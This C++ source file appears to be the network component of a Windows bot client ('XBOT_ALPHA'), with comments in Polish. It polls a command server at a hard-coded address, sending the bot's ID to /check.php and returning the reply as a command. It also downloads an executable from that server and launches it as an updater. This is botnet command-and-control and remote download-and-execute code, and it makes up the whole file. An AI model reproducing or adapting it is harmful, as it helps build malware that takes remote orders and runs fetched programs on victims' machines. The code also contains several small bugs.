#include "Connection.h"
#include "Machine_info.h"


#define CONNECT_IP "192.168.55.100"

bool NewConnection::run_winsock() // Zwraca TRUE jeœli siê powiod³o
{
	WSADATA wsdata;

	return (WSAStartup(MAKEWORD(2, 0), &wsdata) == NULL);
}

SOCKET NewConnection::create_socket()
{
	sockaddr_in sock;
	
	//hostent* HostInfo = gethostbyname("growproject.vxm.pl"); //Zbierz informacje o hoœcie
	//
	//if (HostInfo == NULL) { return 0; } //Zwróæ invalid_socket jeœli nie uda³o siê zebraæ info o hoœcie
	//
	//memcpy(&(sock.sin_addr), HostInfo->h_addr, HostInfo->h_length); //skopiuj IP ze struktury hostent do sock.sin_add
	//
	sock.sin_addr.s_addr = inet_addr(CONNECT_IP);

	sock.sin_family = AF_INET; // Rodzina protoko³ów "AF_INET = np TCP/IP"
	sock.sin_port = htons(80); // Port docelowy po³¹czenia

	memset(&(sock.sin_zero), '/0', 8); // wyzeruj resztê struktury

	int sockfd = socket(PF_INET, SOCK_STREAM, 0); // Utworzenie deskryptora gniazda
	int res = connect(sockfd, (struct sockaddr*)&sock, sizeof(struct sockaddr_in)); // Inicjacja po³¹czenia
	if (res < 0)
		return 0;
	else
	{
		_socket = sockfd;
		return sockfd;
	}
}

bool NewConnection::send_data(std::string http_query)
{
	for (int i = 0; i < http_query.size(); i++)
		if (http_query[i] == ' ')http_query.replace(i,1,"%20");

	std::string get = "GET ";
	std::string typeof_packet = " HTTP/1.1\r\nHost: growproject.vxm.pl\r\nContent-type: application/x-www-form-urlencoded\r\n\r\n";

	get += http_query;
	get += typeof_packet;
	
	const char* payload = get.c_str();

	//printf("\n\nSformulowane zapytanie:\n%s\n\n\n", payload);

	return (send(_socket, payload, strlen(payload), NULL) >= (int)strlen(payload));
}

void NewConnection::close_socket()
{
	closesocket(_socket);
}

NewConnection::~NewConnection()
{
	close_socket();
	WSACleanup();
}

std::string NewConnection::check_command(MachineInfo &info)
{

	std::string id = info.GetBotID();

	std::string payload = "/check.php?id=" + id;
	
	send_data(payload);
	
	char buf[256];
	memset(buf, NULL, 256);

	recv(_socket, buf, 255, NULL);
	std::string result = buf;

	result.erase(0,result.find_last_of("\r\n\r\n")+1);

	return result;
}

void NewConnection::UpdateClient()
{
	DownloadUpdater();
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	CreateProcessA("C:\\XBOT_ALPHA\\updater.exe", NULL, NULL, NULL, FALSE, 0, NULL, "C:\\XBOT_ALPHA\\", &si, &pi);
	exit(1);
}

using namespace std;

#define	BUFFERSIZE 4096

bool NewConnection::DownloadUpdater()
{
	char buffer[BUFFERSIZE];

	NewConnection Connection;

	Connection.run_winsock();
	Connection.create_socket();
	Connection.send_data("/xbotUpdater.exe");

	int nRecv, npos;
	nRecv = recv(Connection._socket, (char*)&buffer, BUFFERSIZE, 0);

	// getting end of header //
	string str_buff = buffer;
	npos = str_buff.find("\r\n\r\n");

	// open the file in the beginning //
	HANDLE hFile;
	hFile = CreateFileA("updater.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

	// Download file //
	DWORD ss;
	while ((nRecv > 0) && (nRecv != INVALID_SOCKET)){
		if (npos > 0){
			char bf[BUFFERSIZE];
			// copy from end position of header //
			memcpy(bf, buffer + (npos + 4), nRecv - (npos + 4));
			WriteFile(hFile, bf, nRecv - (npos + 4), &ss, NULL);
		}
		else{
			// write normally if end not found //
			WriteFile(hFile, buffer, nRecv, &ss, NULL);
		}

		// buffer cleanup  //
		ZeroMemory(&buffer, sizeof(buffer));
		nRecv = recv(Connection._socket, (char*)&buffer, BUFFERSIZE, 0);
		str_buff = buffer;
		npos = str_buff.find("\r\n\r\n");
	}

	// Close connection and handle //
	CloseHandle(hFile);
	Connection.close_socket();
	WSACleanup();

	return TRUE;
}